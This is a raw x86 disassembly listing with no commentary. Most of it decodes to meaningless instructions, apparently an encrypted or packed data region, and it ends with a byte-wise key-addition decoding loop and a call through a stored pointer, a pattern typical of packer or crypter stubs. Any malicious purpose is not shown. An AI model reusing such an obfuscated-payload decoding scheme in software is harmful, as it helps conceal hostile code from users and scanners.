  417b8f:	jecxz  0x417bf5
  417b91:	into   
  417b92:	pushf  
  417b93:	dec    eax
  417b94:	jmp    0x417bfe
  417b96:	inc    ecx
  417b97:	std    
  417b98:	popf   
  417b99:	clc    
  417b9a:	pop    esi
  417b9b:	outs   dx,DWORD PTR ds:[esi]
  417b9c:	hlt    
  417b9d:	pop    ebx
  417b9e:	and    ecx,eax
  417ba0:	loope  0x417bdf
  417ba2:	mov    esp,0x914ae71b
  417ba7:	mov    esi,0x6cf6ce9b
  417bac:	inc    ebx
  417bad:	sbb    DWORD PTR ds:0x5e73e976,ecx
  417bb3:	inc    ebx
  417bb4:	inc    edx
  417bb5:	cmp    eax,esi
  417bb7:	dec    edx
  417bb8:	dec    eax
  417bb9:	sub    BYTE PTR [ebx+0x6f],dl
  417bbc:	jmp    0x417bde
  417bbe:	shr    ah,cl
  417bc0:	mov    bl,0xb0
  417bc2:	add    BYTE PTR ds:0xf5a2bc3f,cl
  417bc8:	mov    fs:0xe517dd13,eax
  417bce:	cmp    bl,BYTE PTR [ecx-0x54a456bc]
  417bd4:	rcl    BYTE PTR [ecx+0x39],cl
  417bd7:	popa   
  417bd8:	mov    ds:0xdd0ebed5,eax
  417bdd:	jmp    DWORD PTR ds:0xf68455e6
  417be3:	jge    0x417be1
  417be5:	scas   eax,DWORD PTR es:[edi]
  417be6:	mov    al,0x70
  417be8:	lods   eax,DWORD PTR ds:[esi]
  417be9:	pop    eax
  417bea:	inc    edi
  417beb:	push   edx
  417bec:	daa    
  417bed:	stos   DWORD PTR es:[edi],eax
  417bee:	in     al,0xd
  417bf0:	arpl   bx,bx
  417bf2:	pop    ebp
  417bf3:	loope  0x417c20
  417bf5:	sahf   
  417bf6:	addr16 add al,0x7e
  417bf9:	mov    ebx,0xb1b69f3
  417bfe:	fsub   st,st(7)
  417c00:	jne    0x417bec
  417c02:	sbb    BYTE PTR [esi+edi*4-0x7a],bl
  417c06:	push   edx
  417c07:	jmp    0xd4c5:0x66d48a82
  417c0e:	jmp    0x417bcc
  417c10:	das    
  417c11:	idiv   DWORD PTR [edi-0x4c839560]
  417c17:	jbe    0x417c80
  417c19:	fcomp  st(1)
  417c1b:	jne    0x417ba0
  417c1d:	aas    
  417c1e:	dec    edi
  417c1f:	(bad)  
  417c20:	hlt    
  417c21:	stos   DWORD PTR es:[edi],eax
  417c22:	outs   dx,DWORD PTR ds:[esi]
  417c23:	sbb    DWORD PTR [edx],ebp
  417c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c26:	jl     0x417c51
  417c28:	jmp    0xc90f666a
  417c2d:	xchg   ebp,eax
  417c2e:	sub    eax,0x51fd7436
  417c33:	nop
  417c34:	pusha  
  417c35:	loopne 0x417c7c
  417c37:	mov    al,ds:0x9c30d480
  417c3c:	push   edi
  417c3d:	xchg   ecx,eax
  417c3e:	loope  0x417c3f
  417c40:	out    dx,eax
  417c41:	fisub  WORD PTR [eax+0x21009b6a]
  417c47:	and    dh,cl
  417c49:	sub    bh,BYTE PTR [ecx+edi*1+0x5f]
  417c4d:	xor    eax,0x65771363
  417c52:	test   al,0xc7
  417c54:	adc    al,0x6f
  417c56:	sub    BYTE PTR ds:0x82aaf265,ah
  417c5c:	jne    0x417c6c
  417c5e:	inc    esi
  417c5f:	fcom   QWORD PTR [ecx-0x5d]
  417c62:	je     0x417c65
  417c64:	sub    eax,0xb9a21741
  417c69:	push   edx
  417c6a:	mov    bl,0x4d
  417c6c:	(bad)  
  417c6d:	stos   DWORD PTR es:[edi],eax
  417c6e:	loope  0x417c5f
  417c70:	das    
  417c71:	fld    st(6)
  417c73:	lods   eax,DWORD PTR ds:[esi]
  417c74:	add    al,0xb9
  417c76:	jo     0x417c32
  417c78:	gs lock out 0x93,al
  417c7c:	inc    ebp
  417c7d:	sbb    ah,BYTE PTR [esi]
  417c7f:	or     al,0x97
  417c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c83:	pop    ss
  417c84:	shr    DWORD PTR [ebx+0xfca2d3d],cl
  417c8a:	sub    eax,0xe12f19c1
  417c8f:	pusha  
  417c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c91:	mov    ah,0x32
  417c93:	lods   eax,DWORD PTR ds:[esi]
  417c94:	add    bl,0x92
  417c97:	jb     0x417ccc
  417c99:	mov    eax,0x15aa7085
  417c9e:	jp     0x417d1f
  417ca0:	push   eax
  417ca1:	outs   dx,DWORD PTR ds:[esi]
  417ca2:	paddq  mm5,QWORD PTR [esi+0x7eddbaa4]
  417ca9:	stos   DWORD PTR es:[edi],eax
  417caa:	adc    ecx,DWORD PTR [eax+0x20a041eb]
  417cb0:	mov    ah,0xaf
  417cb2:	outs   dx,BYTE PTR ds:[esi]
  417cb3:	stos   BYTE PTR es:[edi],al
  417cb4:	aam    0x27
  417cb6:	dec    edx
  417cb7:	bound  edx,QWORD PTR [edi+0x60a2a0e2]
  417cbd:	sbb    DWORD PTR [esi+0x71],eax
  417cc0:	ds inc esp
  417cc2:	cmp    DWORD PTR [edi+0x1ad6c721],edi
  417cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cc9:	aaa    
  417cca:	push   ds
  417ccb:	imul   esi,DWORD PTR [edx+0x75],0x79e95b1a
  417cd2:	clc    
  417cd3:	mov    esi,0x79944168
  417cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cd9:	rol    DWORD PTR [esi-0xe],cl
  417cdc:	loopne 0x417c90
  417cde:	xor    edx,DWORD PTR [ecx]
  417ce0:	sahf   
  417ce1:	loopne 0x417cea
  417ce3:	mov    bl,0xa3
  417ce5:	add    eax,0xbe75796e
  417cea:	ss jae 0x417c77
  417ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cee:	fcmovnu st,st(5)
  417cf0:	shr    ch,0xd
  417cf3:	mov    cl,0x21
  417cf5:	in     al,0xb2
  417cf7:	stos   BYTE PTR es:[edi],al
  417cf8:	iret   
  417cf9:	add    eax,0x4da0cbd8
  417cfe:	jmp    0x417cc9
  417d00:	jne    0x417d33
  417d02:	jge    0x417d0e
  417d04:	idiv   DWORD PTR [edx]
  417d06:	loope  0x417cea
  417d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d09:	test   eax,0x5aab4b4a
  417d0e:	icebp  
  417d0f:	sbb    al,cl
  417d11:	jge    0x417d6b
  417d13:	jae    0x417ce4
  417d15:	ins    BYTE PTR es:[edi],dx
  417d16:	pop    edx
  417d17:	jmp    0xeacdd014
  417d1c:	inc    esp
  417d1d:	loopne 0x417d67
  417d1f:	(bad)  [edx+0x37]
  417d22:	(bad)  
  417d23:	lods   al,BYTE PTR ds:[esi]
  417d24:	lock leave 
  417d26:	inc    edi
  417d27:	data16 xor al,0x9f
  417d2a:	push   ds
  417d2b:	sahf   
  417d2c:	rol    BYTE PTR [edx+eiz*1+0x54],0x12
  417d31:	push   ds
  417d32:	or     eax,0x51ac7af3
  417d37:	push   cs
  417d38:	int    0xc4
  417d3a:	imul   BYTE PTR [ebx+0x4f1ded16]
  417d40:	sub    ecx,DWORD PTR [ecx+0x2a]
  417d43:	test   al,0xb7
  417d45:	adc    al,0x47
  417d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d48:	mov    al,0x2b
  417d4a:	push   ss
  417d4b:	add    esp,DWORD PTR [ecx]
  417d4d:	pop    esp
  417d4e:	mov    bl,0xa9
  417d50:	mov    DWORD PTR [eax+0x55],ebp
  417d53:	scas   al,BYTE PTR es:[edi]
  417d54:	push   edx
  417d56:	(bad)  
  417d57:	cmp    ecx,ecx
  417d59:	xchg   esi,eax
  417d5a:	mov    cl,0xbc
  417d5c:	mov    ebx,DWORD PTR [ebx-0x4e]
  417d5f:	sbb    ecx,DWORD PTR [ebx-0x18d7f121]
  417d65:	out    0x1e,al
  417d67:	scas   al,BYTE PTR es:[edi]
  417d68:	push   ebx
  417d69:	push   cs
  417d6a:	rcl    eax,0x3c
  417d6d:	js     0x417d5b
  417d6f:	leave  
  417d70:	popa   
  417d71:	mov    bl,0x9a
  417d73:	iret   
  417d74:	rcr    BYTE PTR ds:0x2732c03f,1
  417d7a:	rcl    BYTE PTR [edi],0xe
  417d7d:	mov    esp,0xe70e3e05
  417d82:	popf   
  417d83:	(bad)  
  417d84:	test   al,0x7c
  417d86:	add    al,0x21
  417d88:	inc    edx
  417d89:	(bad)  
  417d8a:	aam    0x25
  417d8c:	arpl   WORD PTR [esi-0x7c],bp
  417d8f:	cwde   
  417d90:	cmp    esi,esi
  417d92:	pop    esi
  417d93:	cmp    BYTE PTR [ebp+eax*8+0x59],0x8b
  417d98:	or     BYTE PTR [eax-0xfc83fe6],0x7d
  417d9f:	lock out dx,eax
  417da1:	aaa    
  417da2:	xchg   esp,eax
  417da3:	mov    ebp,0x77e9cde4
  417da8:	sbb    DWORD PTR [ebx],esi
  417daa:	cwde   
  417dab:	arpl   bp,cx
  417dad:	stos   BYTE PTR es:[edi],al
  417dae:	dec    esi
  417daf:	add    al,0x66
  417db1:	outs   dx,DWORD PTR ds:[esi]
  417db2:	fld    st(5)
  417db4:	fnsave [ebp+0x2d]
  417db7:	es cmp al,0xbe
  417dba:	int3   
  417dbb:	and    esp,DWORD PTR ds:0x4c93a701
  417dc1:	jno    0x417d83
  417dc3:	leave  
  417dc4:	mov    eax,0x64e379ad
  417dc9:	adc    BYTE PTR [edi+0x28],bh
  417dcc:	retf   
  417dcd:	xor    edx,ebx
  417dcf:	iret   
  417dd0:	jno    0x417e3c
  417dd2:	or     DWORD PTR [edx],0xffffffe3
  417dd5:	mov    al,0x74
  417dd7:	jo     0x417e39
  417dd9:	xor    eax,0x98f50abd
  417dde:	pop    ebx
  417ddf:	popf   
  417de0:	push   cs
  417de1:	adc    eax,0xdce0fdd7
  417de6:	and    edx,esp
  417de8:	cmp    eax,0x84d2f5f0
  417ded:	cwde   
  417dee:	inc    edi
  417def:	pop    ss
  417df0:	mov    edx,0x9d321ccd
  417df5:	call   0xcc889187
  417dfa:	mov    bh,0xcd
  417dfc:	leave  
  417dfd:	pop    edi
  417dfe:	sub    dl,BYTE PTR [edi]
  417e00:	mov    bh,0x9e
  417e02:	int    0x56
  417e04:	mov    esi,DWORD PTR [ebp-0x4]
  417e07:	call   esi
  417e09:	mov    DWORD PTR [ebp-0x3c],eax
  417e0c:	cmp    DWORD PTR [ebp-0x3c],0x57
  417e10:	jne    0x417e1e
  417e12:	mov    edx,DWORD PTR [ebp-0x24]
  417e15:	push   edx
  417e16:	call   0x401000
  417e1b:	add    esp,0x4
  417e1e:	xor    eax,eax
  417e20:	pop    esi
  417e21:	mov    esp,ebp
  417e23:	pop    ebp
  417e24:	ret    
  417e25:	push   ebp
  417e26:	mov    ebp,esp
  417e28:	sub    esp,0x124
  417e2e:	xor    eax,eax
  417e30:	mov    esp,ebp
  417e32:	pop    ebp
  417e33:	ret    
  417e34:	push   ebp
  417e35:	mov    ebp,esp
  417e37:	sub    esp,0x2c
  417e3a:	push   ebx
  417e3b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  417e42:	mov    DWORD PTR [ebp-0xc],0x0
  417e49:	mov    DWORD PTR [ebp-0x20],0x1
  417e50:	mov    DWORD PTR [ebp-0x10],0x0
  417e57:	mov    eax,DWORD PTR [ebp+0xc]
  417e5a:	mov    DWORD PTR [ebp-0x1c],eax
  417e5d:	mov    DWORD PTR [ebp-0x18],0x0
  417e64:	mov    DWORD PTR [ebp-0x8],0x0
  417e6b:	mov    DWORD PTR [ebp-0x24],0x0
  417e72:	mov    ecx,DWORD PTR [ebp-0x4]
  417e75:	sub    ecx,0x1
  417e78:	mov    DWORD PTR [ebp-0x4],ecx
  417e7b:	mov    edx,DWORD PTR [ebp+0x8]
  417e7e:	mov    DWORD PTR [ebp-0x10],edx
  417e81:	mov    DWORD PTR [ebp-0x28],0x1
  417e88:	mov    eax,DWORD PTR [ebp-0x4]
  417e8b:	add    eax,0x2
  417e8e:	mov    DWORD PTR [ebp-0x4],eax
  417e91:	mov    ecx,DWORD PTR [ebp-0x1c]
  417e94:	add    ecx,DWORD PTR [ebp-0x4]
  417e97:	mov    dl,BYTE PTR [ecx+0x1]
  417e9a:	mov    BYTE PTR [ebp-0x11],dl
  417e9d:	mov    eax,DWORD PTR [ebp-0x4]
  417ea0:	add    eax,0x1
  417ea3:	mov    DWORD PTR [ebp-0x4],eax
  417ea6:	mov    cl,BYTE PTR [ebp-0x11]
  417ea9:	mov    BYTE PTR [ebp-0x29],cl
  417eac:	push   edx
  417ead:	pop    ebx
  417eae:	mov    ecx,ebx
  417eb0:	mov    edx,DWORD PTR [ebp-0x10]
  417eb3:	add    edx,DWORD PTR [ebp-0x4]
  417eb6:	mov    al,BYTE PTR [ebp-0x29]
  417eb9:	mov    BYTE PTR [edx],al
  417ebb:	mov    ebx,esi
  417ebd:	mov    ecx,DWORD PTR [ebp+0x14]
  417ec0:	add    ecx,DWORD PTR [ebp-0x8]
  417ec3:	movzx  edx,BYTE PTR [ecx]
  417ec6:	mov    DWORD PTR [ebp-0xc],edx
  417ec9:	mov    eax,DWORD PTR [ebp-0x8]
  417ecc:	mov    ecx,DWORD PTR [ebp-0x28]
  417ecf:	add    eax,ecx
  417ed1:	mov    DWORD PTR [ebp-0x8],eax
  417ed4:	mov    eax,DWORD PTR [ebp-0x8]
  417ed7:	shr    eax,0x3
  417eda:	mov    ecx,0x1
  417edf:	sub    ecx,eax
  417ee1:	mov    DWORD PTR [ebp-0x20],ecx
  417ee4:	shr    eax,cl
  417ee6:	mov    edx,DWORD PTR [ebp-0x8]
  417ee9:	imul   edx,DWORD PTR [ebp-0x20]
  417eed:	mov    DWORD PTR [ebp-0x8],edx
  417ef0:	shl    ebx,0x3
  417ef3:	mov    eax,DWORD PTR [ebp-0x10]
  417ef6:	add    eax,DWORD PTR [ebp-0x4]
  417ef9:	movzx  ecx,BYTE PTR [eax]
  417efc:	add    ecx,DWORD PTR [ebp-0xc]
  417eff:	mov    edx,DWORD PTR [ebp-0x10]
  417f02:	add    edx,DWORD PTR [ebp-0x4]
  417f05:	mov    BYTE PTR [edx],cl
  417f07:	mov    eax,DWORD PTR [ebp-0x4]
  417f0a:	sub    eax,0x2
  417f0d:	mov    DWORD PTR [ebp-0x4],eax
  417f10:	mov    ecx,DWORD PTR [ebp-0x4]
  417f13:	cmp    ecx,DWORD PTR [ebp+0x10]
  417f16:	jl     0x417e88
  417f1c:	pop    ebx
  417f1d:	mov    esp,ebp
  417f1f:	pop    ebp
  417f20:	ret    
  417f21:	int3   
  417f22:	jmp    DWORD PTR ds:0x418008
